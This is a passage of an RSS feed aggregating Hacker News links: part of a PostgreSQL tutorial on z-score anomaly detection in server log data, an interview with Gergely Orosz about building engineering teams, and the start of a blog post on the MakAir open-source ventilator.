<div><pre><span></span><span>WITH</span> <span>series</span> <span>AS</span> <span>(</span>
   <span>SELECT</span> <span>*</span>
   <span>FROM</span> <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span>
<span>),</span>
<span>stats</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>avg</span><span>(</span><span>n</span><span>)</span> <span>series_mean</span><span>,</span>
       <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>as</span> <span>series_stddev</span>
   <span>FROM</span>
       <span>series</span>
<span>)</span>
<span>SELECT</span>
   <span>n</span><span>,</span>
<span>   <span>(</span><span>n</span> <span>-</span> <span>series_mean</span><span>)</span> <span>/</span> <span>series_stddev</span> <span>as</span> <span>zscore</span>
</span><span>FROM</span>
   <span>series</span><span>,</span>
   <span>stats</span><span>;</span>

<span>n  ‚îÇ         zscore</span>
<span>‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span>
<span> 2 ‚îÇ -0.75703329861022517346</span>
<span> 3 ‚îÇ -0.43259045634870009448</span>
<span> 5 ‚îÇ  0.21629522817435006346</span>
<span> 2 ‚îÇ -0.75703329861022517346</span>
<span> 3 ‚îÇ -0.43259045634870009448</span>
<span>12 ‚îÇ      2.4873951240050256</span>
<span> 5 ‚îÇ  0.21629522817435006346</span>
<span> 3 ‚îÇ -0.43259045634870009448</span>
<span> 4 ‚îÇ -0.10814761408717501551</span>
</pre></div>


<p>Like before, we can detect anomalies by searching for values which are outside the acceptable range using the z-score:</p>
<div><pre><span></span><span>WITH</span> <span>series</span> <span>AS</span> <span>(</span>
   <span>SELECT</span> <span>*</span>
   <span>FROM</span> <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span>
<span>),</span>
<span>stats</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>avg</span><span>(</span><span>n</span><span>)</span> <span>series_avg</span><span>,</span>
       <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>as</span> <span>series_stddev</span>
   <span>FROM</span>
       <span>series</span>
<span>),</span>
<span>zscores</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>n</span><span>,</span>
       <span>(</span><span>n</span> <span>-</span> <span>series_avg</span><span>)</span> <span>/</span> <span>series_stddev</span> <span>AS</span> <span>zscore</span>
   <span>FROM</span>
       <span>series</span><span>,</span>
       <span>stats</span>
<span>)</span>
<span>SELECT</span>
   <span>*</span><span>,</span>
   <span>zscore</span> <span>NOT</span> <span>BETWEEN</span> <span>-</span><span>1</span> <span>AND</span> <span>1</span> <span>AS</span> <span>is_anomaly</span>
<span>FROM</span>
   <span>zscores</span><span>;</span>

<span>n  ‚îÇ         zscore          ‚îÇ is_anomaly</span>
<span>‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span>
<span> 2 ‚îÇ -0.75703329861022517346 ‚îÇ f</span>
<span> 3 ‚îÇ -0.43259045634870009448 ‚îÇ f</span>
<span> 5 ‚îÇ  0.21629522817435006346 ‚îÇ f</span>
<span> 2 ‚îÇ -0.75703329861022517346 ‚îÇ f</span>
<span> 3 ‚îÇ -0.43259045634870009448 ‚îÇ f</span>
<span><span>12 ‚îÇ      2.4873951240050256 ‚îÇ t</span>
</span><span> 5 ‚îÇ  0.21629522817435006346 ‚îÇ f</span>
<span> 3 ‚îÇ -0.43259045634870009448 ‚îÇ f</span>
<span> 4 ‚îÇ -0.10814761408717501551 ‚îÇ f</span>
</pre></div>


<p>Using z-score, we also identified 12 as an anomaly in this series.</p>
<h3 id="optimizing-z-score"><a href="#optimizing-z-score">Optimizing Z-Score</a></h3>
<p>So far we used one standard deviation from the mean, or a z-score of ¬±1 to identify anomalies. Changing the z-score threshold can affect our results. For example, let's see what anomalies we identify when the z-score is greater than 0.5 and when it's greater than 3:</p>
<div><pre><span></span><span>WITH</span> <span>series</span> <span>AS</span> <span>(</span>
   <span>SELECT</span> <span>*</span>
   <span>FROM</span> <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span>
<span>),</span>
<span>stats</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>avg</span><span>(</span><span>n</span><span>)</span> <span>series_avg</span><span>,</span>
       <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>as</span> <span>series_stddev</span>
   <span>FROM</span>
       <span>series</span>
<span>),</span>
<span>zscores</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>n</span><span>,</span>
       <span>(</span><span>n</span> <span>-</span> <span>series_avg</span><span>)</span> <span>/</span> <span>series_stddev</span> <span>AS</span> <span>zscore</span>
   <span>FROM</span>
       <span>series</span><span>,</span>
       <span>stats</span>
<span>)</span>
<span>SELECT</span>
   <span>*</span><span>,</span>
<span>   <span>zscore</span> <span>NOT</span> <span>BETWEEN</span> <span>-</span><span>0.5</span> <span>AND</span> <span>0.5</span> <span>AS</span> <span>is_anomaly_0_5</span><span>,</span>
</span><span>   <span>zscore</span> <span>NOT</span> <span>BETWEEN</span> <span>-</span><span>1</span> <span>AND</span> <span>1</span> <span>AS</span> <span>is_anomaly_1</span><span>,</span>
</span><span>   <span>zscore</span> <span>NOT</span> <span>BETWEEN</span> <span>-</span><span>3</span> <span>AND</span> <span>3</span> <span>AS</span> <span>is_anomaly_3</span>
</span><span>FROM</span>
   <span>zscores</span><span>;</span>

<span>n  ‚îÇ         zscore          ‚îÇ is_anomaly_0_5 ‚îÇ is_anomaly_1 ‚îÇ is_anomaly_3</span>
<span>‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span>
<span> 2 ‚îÇ -0.75703329861022517346 ‚îÇ t              ‚îÇ f            ‚îÇ f</span>
<span> 3 ‚îÇ -0.43259045634870009448 ‚îÇ f              ‚îÇ f            ‚îÇ f</span>
<span> 5 ‚îÇ  0.21629522817435006346 ‚îÇ f              ‚îÇ f            ‚îÇ f</span>
<span> 2 ‚îÇ -0.75703329861022517346 ‚îÇ t              ‚îÇ f            ‚îÇ f</span>
<span> 3 ‚îÇ -0.43259045634870009448 ‚îÇ f              ‚îÇ f            ‚îÇ f</span>
<span>12 ‚îÇ      2.4873951240050256 ‚îÇ t              ‚îÇ t            ‚îÇ f</span>
<span> 5 ‚îÇ  0.21629522817435006346 ‚îÇ f              ‚îÇ f            ‚îÇ f</span>
<span> 3 ‚îÇ -0.43259045634870009448 ‚îÇ f              ‚îÇ f            ‚îÇ f</span>
<span> 4 ‚îÇ -0.10814761408717501551 ‚îÇ f              ‚îÇ f            ‚îÇ f</span>
</pre></div>


<p>Let's see what we got:</p>
<ul>
<li>When we decreased the z-score threshold to 0.5, we identified the value 2 as an anomaly in addition to the value 12.</li>
<li>When we increased the z-score threshold to 3 we did not identify any anomaly.</li>
</ul>
<p>The quality of our results are directly related to the parameters we set for the query. Later we'll see how using backtesting can help us identify ideal values.</p>
<hr>
<h2 id="analyzing-a-server-log"><a href="#analyzing-a-server-log">Analyzing a Server Log</a></h2>
<p>Application servers such as nginx, Apache and IIS write a lot of useful information to access logs. The data in these logs can be extremely useful in identifying anomalies.</p>
<p>We are going to analyze logs of a web application, so the data we are most interested in is the timestamp and the status code of every response from the server. To illustrate the type of insight we can draw from just this data:</p>
<ul>
<li><strong>A sudden increase in 500 status code</strong>: You may have a problem in the server. Did you just push a new version? Is there an external service you're using that started failing in unexpected ways?</li>
<li><strong>A sudden increase in 400 status code</strong>: You may have a problem in the client. Did you change some validation logic and forgot to update the client? Did you make a change and forgot to handle backward compatibility?</li>
<li><strong>A sudden increase in 404 status code</strong>: You may have an SEO problem. Did you move some pages and forgot to set up redirects? Is there some script kiddy running a scan on your site?</li>
<li><strong>A sudden increase in 200 status code</strong>: You either have some significant legit traffic coming in, or you are under a DOS attack. Either way, you probably want to check where it's coming from.</li>
</ul>
<h3 id="preparing-the-data"><a href="#preparing-the-data">Preparing the Data</a></h3>
<p>Parsing and processing logs is outside the scope of this article, so let's assume we did that and we have a table that looks like this:</p>
<div><pre><span></span><span>CREATE</span> <span>TABLE</span> <span>server_log_summary</span> <span>AS</span> <span>(</span>
   <span>period</span> <span>timestamptz</span><span>,</span>
   <span>status_code</span> <span>int</span><span>,</span>
   <span>entries</span> <span>int</span>
<span>);</span>
</pre></div>


<p>The table stores the number of entries for each status code at a given period. For example, our table stores how many responses returned each status code every minute:</p>
<div><pre><span></span><span>db=#</span> <span>SELECT</span> <span>*</span> <span>FROM</span> <span>server_log_summary</span> <span>ORDER</span> <span>BY</span> <span>period</span> <span>DESC</span> <span>LIMIT</span> <span>10</span><span>;</span>

<span>        period         ‚îÇ status_code ‚îÇ entries</span>
<span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span>
<span>2020-08-01 18:00:00+00 ‚îÇ         200 ‚îÇ    4084</span>
<span>2020-08-01 18:00:00+00 ‚îÇ         404 ‚îÇ       0</span>
<span>2020-08-01 18:00:00+00 ‚îÇ         400 ‚îÇ      24</span>
<span>2020-08-01 18:00:00+00 ‚îÇ         500 ‚îÇ       0</span>
<span>2020-08-01 17:59:00+00 ‚îÇ         400 ‚îÇ      12</span>
<span>2020-08-01 17:59:00+00 ‚îÇ         200 ‚îÇ    3927</span>
<span>2020-08-01 17:59:00+00 ‚îÇ         500 ‚îÇ       0</span>
<span>2020-08-01 17:59:00+00 ‚îÇ         404 ‚îÇ       0</span>
<span>2020-08-01 17:58:00+00 ‚îÇ         400 ‚îÇ       2</span>
<span>2020-08-01 17:58:00+00 ‚îÇ         200 ‚îÇ    3850</span>
</pre></div>


<p>Note that the table has a row for every minute, even if the status code was never returned in that minute. Given a table of statuses, it's very tempting to do something like this:</p>
<div><pre><span></span><span>-- Wrong!</span>
<span>SELECT</span>
   <span>date_trunc</span><span>(</span><span>'minute'</span><span>,</span> <span>timestamp</span><span>)</span> <span>AS</span> <span>period</span><span>,</span>
   <span>status_code</span><span>,</span>
   <span>count</span><span>(</span><span>*</span><span>)</span> <span>AS</span> <span>entries</span>
<span>FROM</span>
   <span>server_log</span>
<span>GROUP</span> <span>BY</span>
   <span>period</span><span>,</span>
   <span>status_code</span><span>;</span>
</pre></div>


<p>This is a common mistake and it can leave you with gaps in the data. Zero is a value, and it holds a significant meaning. A better approach is to create an "axis", and join to it:</p>
<div><pre><span></span><span>-- Correct!</span>
<span>WITH</span> <span>axis</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>status_code</span><span>,</span>
       <span>generate_series</span><span>(</span>
           <span>date_trunc</span><span>(</span><span>'minute'</span><span>,</span> <span>now</span><span>()),</span>
           <span>date_trunc</span><span>(</span><span>'minute'</span><span>,</span> <span>now</span><span>()</span> <span>-</span> <span>interval</span> <span>'1 hour'</span><span>),</span>
           <span>interval</span> <span>'1 minute'</span> <span>*</span> <span>-</span><span>1</span>
       <span>)</span> <span>AS</span> <span>period</span>
   <span>FROM</span> <span>(</span>
       <span>VALUES</span> <span>(</span><span>200</span><span>),</span> <span>(</span><span>400</span><span>),</span> <span>(</span><span>404</span><span>),</span> <span>(</span><span>500</span><span>)</span>
   <span>)</span> <span>AS</span> <span>t</span><span>(</span><span>status_code</span><span>)</span>
<span>)</span>
<span>SELECT</span>
   <span>a</span><span>.</span><span>period</span><span>,</span>
   <span>a</span><span>.</span><span>status_code</span><span>,</span>
   <span>count</span><span>(</span><span>*</span><span>)</span> <span>AS</span> <span>entries</span>
<span>FROM</span>
   <span>axis</span> <span>a</span>
   <span>LEFT</span> <span>JOIN</span> <span>server_log</span> <span>l</span> <span>ON</span> <span>(</span>
       <span>date_trunc</span><span>(</span><span>'minute'</span><span>,</span> <span>l</span><span>.</span><span>timestamp</span><span>)</span> <span>=</span> <span>a</span><span>.</span><span>period</span>
       <span>AND</span> <span>l</span><span>.</span><span>status_code</span> <span>=</span> <span>a</span><span>.</span><span>status_code</span>
   <span>)</span>
<span>GROUP</span> <span>BY</span>
   <span>period</span><span>,</span></pre></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hakibenita.com/sql-anomaly-detection">https://hakibenita.com/sql-anomaly-detection</a></em></p>]]>
            </description>
            <link>https://hakibenita.com/sql-anomaly-detection</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590126</guid>
            <pubDate>Fri, 25 Sep 2020 14:28:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Great Engineering Teams, with Gergely Orosz]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24590096">thread link</a>) | @brlnwest
<br/>
September 25, 2020 | https://evolutionarymanager.com/building-great-engineering-teams-gergely-orosz/ | <a href="https://web.archive.org/web/*/https://evolutionarymanager.com/building-great-engineering-teams-gergely-orosz/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1519389950473-47ba0277781c?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1519389950473-47ba0277781c?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1519389950473-47ba0277781c?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
                            https://images.unsplash.com/photo-1519389950473-47ba0277781c?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1519389950473-47ba0277781c?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Building Great Engineering Teams, with Gergely Orosz">
            </figure>

            <section>
                <div>
                    <p>If you have ever come across<a href="https://blog.pragmaticengineer.com/"> The Pragmatic Engineer</a>, you probably know the man behind it,<a href="https://twitter.com/GergelyOrosz"> Gergely Orosz</a>. More than a simple blog, or newsletter, it is a treasure trove of knowledge on the ins and outs of Engineering, Engineering Management and, in general, all things leadership in tech. As the website name implies, Gergely is all about pragmatism and helping engineering leaders develop themselves, while delivering massive value to their companies and those around them.</p><figure><img src="https://evolutionarymanager.com/content/images/2020/09/orosz-resized-1.jpg" alt=""><figcaption>Gergely Orosz</figcaption></figure><p>Exploring the interface between Product and Engineering, and building world-class Engineering teams are two interrelated topics that we both share as interests. For that reason, I invited Gergely for a chat with me to continue the discussion I started here in an<a href="https://evolutionarymanager.com/chasing-agile-rainbow/"> earlier conversation</a> with my good friend<a href="https://twitter.com/kettiby"> Mohammed Rizwan</a>.</p><p><strong>Gergely, thanks for joining me. Tell us a little about yourself and your background.</strong></p><p>I've been in engineering for more than a decade, starting at smaller companies, but then joined JP Morgan where I worked for a year. JP Morgan was more an investment bank than a tech company but I learned a lot about finance. Then I moved to Skype, which had just been acquired by Microsoft and we were building Skype for Xbox One in London, collaborating with the Xbox team in Redmond. That was a really good experience, working with a US-based company but from Europe. Then I moved to Skyscanner, where I built a small mobile team, building a B2B travel tool.</p><p>Finally, I moved to Uber, which has been a really good learning so far. I joined the Amsterdam office when it was about 25 engineers, and three years later we were up to 150, essentially almost doubling every year. I actually joined as an engineer ‚Äì which gave me the opportunity of knowing the codebase ‚Äì did that for 6 months and then became a manager. Eventually, I started leading multiple teams and managed my first manager in a bigger group. Initially, my team owned everything payments in the Rider app but now we've transitioned to a platform based approach. I would call it a platform-focused team with product impact.</p><p><strong>That's actually a good segue into the first question. How do you think about understanding the value of what the teams build and deciding what to work on?</strong></p><p>When I joined Uber, we changed directions more frequently based on new priorities coming fromTravis Kalanick, like adding tipping to the app. This time was very much about growth and making bold decisions. Now, with Dara as CEO and the business environment maturing, I would actually compare it to how Amazon operates, with a focus on efficiency, getting to profitability and operational excellence.</p><p>At some point, I started to put my foot down on not starting to work on a project that did not have some sort of impact estimated. Uber is big on data driven decisions, with lots of data scientists, and PMs typically pair with them. So we'd estimate impact on everything and then just stack-rank it. This, by the way, doesn't necessarily have to be dollars. With tech debt work, engineers often say we should refactor this API, for example. Well, what's the impact? If it's a system that's going to be retired or has little to no users, then the impact will be meaningless. So you have to ask yourself: are we saving money? Is it about reliability? Is it reducing frustration? Often people will say, "You know what? You're right, it doesn't make sense". Or, "Holy Moly! This has impact on so many people".</p><p>One example of not using dollars to make business decisions was how a Developer Experience team made the case that 6-core Macbooks would compile the mobile app 30% faster, shaving off around a minute for each compilation. Multiply that by 400 engineers, each doing a few builds per day, and it adds up to a lot. This is how this team upgrading to better hardware for mobile engineers at the company. I found this data-driven approach eye-opening...</p><p><strong>A key element of high-performance in tech teams is visibility into how the team operates and therefore the ability to surface issues earlier. How do you think about this in the context of your teams?</strong></p><p>A lot of people are doing the whole JIRA thing, looking at story points and velocity. I personally am not a huge fan of deferring to these metrics. To me, first you need a spec that makes it clear what the work is and why it‚Äôs important. Not many things are formalized at Uber, but two things are: first, the product requirements specification, owned by the product managers, which also needs to be signed off by the business. In the past,I have seen projects built where legal later came in and stopped the launch. In that case, months of work went to waste. Another thing we do is an engineering plan, no matter how lightweight it may be.</p><p>My approach then is to think more in terms of milestones rather than sprints. For example, we had this massive project building Skype for Xbox from the ground up. We broke down a year-long project to four milestones: something like audio, video, chat and production-ready. And regardless of JIRA and boards, the question was always: what is the next milestone? And what can we do about it? So until audio calling were not working, we weren't doing anything on video. Everyone swarmed, helping get audio up and running first. I like to replicate this teamwork focused on finishing the current milestone.</p><p>Also for visibility, and because I believe in helping people grow into more leadership roles, I typically ask the teams to write up a weekly email update, including maybe one or two stakeholders, describing current progress. This pushes accountability on the teams, acting as a sort of contract I like to have. And it helps you stay focused on what the next milestone is.</p><p><strong>Love the clarity in that. Another aspect I find critical is the ability to change, both in terms of the code and the teams themselves. How do you look at maintaining "changeability" in the face of extreme growth?</strong></p><p>At Uber, where I've been for the past 4 years, a good chunk of time has been spent on<a href="https://lethain.com/migrations/"> migrations</a>, just because we grew so fast. For example, many of our old systems were built on the assumption that we'd be doing Rides only, and now you have Eats and Freight and other new businesses. In an environment like this you just have to get good at migrations. When you start doing it a lot, you learn what the costs are and how to do it well.</p><p>I think people sometimes <a href="https://blog.pragmaticengineer.com/software-architecture-is-overrated/">overthink architecture</a>, and spend far too much time on this area, upfronts. You can try to build all these beautiful systems that are easy to customize and extend but that really is an unrealistic goal. My two cents is that infrastructure is more important than architecture: when it's easy to deploy, monitor, spin up a new service ‚Äì and Uber is a good example of this ‚Äì you end up with thousands of microservices because it's just so easy to do it. So you can build a service with monitoring and start moving things over. That's not possible if it's really hard to set things up with data included. So I would say, focus on infrastructure and worry less about maintainability.</p><p>The other thing about changeability is that struggling organizations usually have leaders who haven't gone through the ‚Äúmigration hell‚Äù of a fast-growing organization before. But if you don't act in tackling your tech debt, you'll start to have churn and you can lose your best engineers over a matter of years. So next time around, as a leader you're going to put your foot down and maybe you'll be at a VP or CTO level position. At Uber, I observed our CTO understanding this and creating time for engineering to tackle tech debt that was caused by the fast growth. For example, the whole company did Fixit Weeks - a week to tackle tech debt - and engineering foundations work was prioritized at the company level. You can, of course, do a lot of this bottom-up but if people at the top don't appreciate the importance of it, as an engineer, you're bound to get frustrated.</p><p><strong>Wade Chambers, a former VP Engineering at Twitter, once said the role of any Engineering Manager is to win and to increase your capacity to win. It resonated with me a lot in terms of continuous improvement. How do you promote that explicitly within your teams?</strong></p><p>I find that when a new team comes together, they learn really fast. If you just give them a basic framework, and you're solving new problems and you reflect on them and how you did it, you improve a lot. Autonomy helps greatly as well. Instead of getting a project manager who'll tell everybody what to do, I <a href="https://blog.pragmaticengineer.com/a-team-where-everyone-is-a-leader/">give that autonomy to the engineers</a>, with some guardrails. So the people in my teams tend to eventually all become pretty decent project managers.</p><p>Continuous improvement comes from pushing teams to commit, giving them space to fail and then ensuring there's reflection on what happened and what we should change. So that's one way to grow. The second thing is being ruthless about not doing manual work. In most cases, either figure out how to automate it or don't do it, which might require thinking outside the box.</p><p>I tell people that I'm always accountable for what we do, and our projects, which means that if someone should get in trouble or get fired, that someone should be me, the engineering manager. And in return, I ask others to take on responsibility for their work. Hopefully, this creates an environment where failure is not a problem but something we can learn from. Whatever happens, as long as someone tells me what they've learned and how they're going to change things, I'm super happy. And, by the way, there's this great book about this mindset called<a href="https://www.amazon.com/Turn-Ship-Around-Turning-Followers/dp/1591846404"> <em>Turn the Ship Around!: A True Story of Turning Followers into Leaders</em></a><em>. </em>I recommend this book for people to read.</p><p>So, in the end, continuous improvement boils down to "forcing" or encouraging people to think on their feet, come up with suggestions and have them follow through with it. I'm curious about ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://evolutionarymanager.com/building-great-engineering-teams-gergely-orosz/">https://evolutionarymanager.com/building-great-engineering-teams-gergely-orosz/</a></em></p>]]>
            </description>
            <link>https://evolutionarymanager.com/building-great-engineering-teams-gergely-orosz/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590096</guid>
            <pubDate>Fri, 25 Sep 2020 14:26:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Beyond Dynamic vs. Static Types (2015) [video]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24590002">thread link</a>) | @codesections
<br/>
September 25, 2020 | https://ftp.heanet.ie/mirrors/fosdem-video/2015/devroom-perl/perl6_beyond_dynamic_vs_static.mp4 | <a href="https://web.archive.org/web/*/https://ftp.heanet.ie/mirrors/fosdem-video/2015/devroom-perl/perl6_beyond_dynamic_vs_static.mp4">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://ftp.heanet.ie/mirrors/fosdem-video/2015/devroom-perl/perl6_beyond_dynamic_vs_static.mp4</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590002</guid>
            <pubDate>Fri, 25 Sep 2020 14:19:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MakAir: Covid-19 ventilator with a Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24589853">thread link</a>) | @telecoteco
<br/>
September 25, 2020 | https://blog.senx.io/makair-covid-19-ventilator-with-a-raspberry-pi/ | <a href="https://web.archive.org/web/*/https://blog.senx.io/makair-covid-19-ventilator-with-a-raspberry-pi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>During the covid-19 crisis, The birth of the first open source data enabled ventilator. </p><article>
      
<p>Back to March 20, 2020. <a href="https://twitter.com/waxzce" target="_blank" rel="noreferrer noopener">Quentin Adam</a>, with some friends living in Nantes, is trying to build a ventilator prototype with 3D printing and Arduino, in response to a shortage of equipment. </p>



<p><strong>Project MakAir is started</strong>. </p>



<p>Quentin, a software expert, is struggling with the electronics part and looking for electronics engineers. Among his friends is Mathias, SenX CTO. That is how Mathias asked me to review the electronics part of the project. My first call with Quentin was to help him connect an old pressure sensor to an Arduino, during the late evening of March 20.</p>



<p><strong>The goal was clear: to mass-produce an open-source medical ventilator</strong>. Crazy! Looking at the project that day, it looked like an "amateur" project. So I did the first real schematics, the first BOM, the first Radiospares, and Farnell reference list during the weekend, discussing with more and more people on the MakAir Slack. </p>



<figure></figure>



<h3>Amateur? Not really...</h3>



<p>Next Thursday, I understood that the small "amateur" project is quickly getting big. Two electronics companies detached people, and a whole regulatory team was up. In this team, there were some experts in medical devices. We also knew that we were in a shortlist of projects that the French government is looking at closely.</p>



<p>I soon realized that in Nantes, there is no one able to actually make the prototypes. <a href="https://blog.senx.io/connecting-a-beertender-to-warp-10-using-mqtt-on-lorawan-with-thethingsnetwork/" target="_blank" rel="noreferrer noopener">Engineers with prototyping knowledge</a> are scarce, I just know a few of them like me. So, on the 25th during the evening, in a few minutes, I convinced Cherine, a former Renault Sport colleague living near Paris who has the same knowledge of prototyping as me, to join the project as well.</p>



<p><strong>On the 26th, I joined the MakAir core team, choosing to confine myself with 17 other people to make project MakAir a reality</strong>. Cherine came from Paris the same day I came from Brest. At the same time in France, 100 people were already helping us remotely. </p>



<p>I brought with me all my personal tools, from soldering iron to oscilloscope, and tons of components. </p>



<figure><blockquote><p>If I had been told this would last 25 days, I would have brought more than 3 days of clothing!</p></blockquote></figure>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-1024x682.jpg" alt="working in the Palace, Nantes" width="509" height="339" srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-1024x682.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328-600x400.jpg 600w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6328.jpg 2000w" sizes="(max-width: 509px) 100vw, 509px"><figcaption>One sleepless night later, the first functional prototype was up.</figcaption></figure></div>







<p>Three days later, <strong>the <a href="http://www.cea.fr/" target="_blank" rel="noreferrer noopener">CEA</a></strong> (french government agency for atomic energy) is now supporting us. On the 31<sup>st</sup> of March, we all moved from Nantes to Grenoble CEA facility, traveling on a nearly empty motorway.</p>



<p>The first prototype had basic electronics: STM32 Nucleo, a small 4 lines screen, a few buttons, a good precision pressure sensor, and several servo outputs. <strong>This first prototype allows us to make a pig breath for 4 hours</strong> on the 3rd of April, only 2 weeks after the project started.</p>



